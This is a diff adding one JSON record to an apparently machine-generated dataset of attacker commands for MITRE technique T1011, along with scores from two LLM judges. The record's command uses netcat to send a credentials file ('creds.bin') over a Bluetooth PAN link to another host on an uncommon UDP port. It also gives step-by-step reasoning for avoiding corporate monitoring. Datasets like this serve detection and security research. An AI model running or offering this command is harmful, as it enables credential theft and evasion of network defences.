@@ -1,0 +1,48 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "nohup tcpdump -i bnep0 -nn udp port 53287 -U -w /dev/null >/dev/null 2>&1 & nc -u -s 192.168.44.10 192.168.44.20 53287 < /var/tmp/.cache/creds.bin",
+  "explanation": "Uses Bluetooth PAN (bnep0) and UDP on a non-standard port to exfiltrate a blob while silently monitoring only that traffic. This is exfiltration over a different network medium per T1011.",
+  "rationale_steps": [
+    "Select Bluetooth PAN to avoid the primary corporate network.",
+    "Use UDP on an uncommon port (53287) to blend with low-noise traffic.",
+    "Run tcpdump scoped to bnep0 and that port to minimize footprint.",
+    "Stream the file with netcat bound to the bnep0 source address."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-a2471e69-e5a3a6fa",
+  "source_prompt_hash": "a2471e69",
+  "timestamp_utc": "2025-09-30T08:19:52.942834Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with correct flags, redirections, and backgrounding for tcpdump followed by a valid nc invocation.",
+        "semantic_score": 2,
+        "semantic_justification": "While it can exfiltrate a file over UDP via a Bluetooth PAN IP and start a capture, it does not implement traffic signaling as described for T1011 and tcpdump typically requires elevated privileges, undermining the 'Privilege: None' claim for the monitoring.",
+        "combined_score": 3.5,
+        "confidence": 0.7,
+        "timestamp": "2025-10-01T16:02:49.627072Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using valid commands, flags, arguments, redirects, and command separators without any parsing errors.",
+        "semantic_score": 3,
+        "semantic_justification": "While the `nc` command plausibly exfiltrates data over UDP to a non-standard port, the `tcpdump` component specified for 'silently monitoring' will likely fail to capture any traffic without elevated privileges (root or specific capabilities), contradicting the 'Privilege: None' statement and thus failing to achieve the full claimed intent.",
+        "combined_score": 4.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T16:03:16.189950Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.5,
+    "llm_average_score": 3.75,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
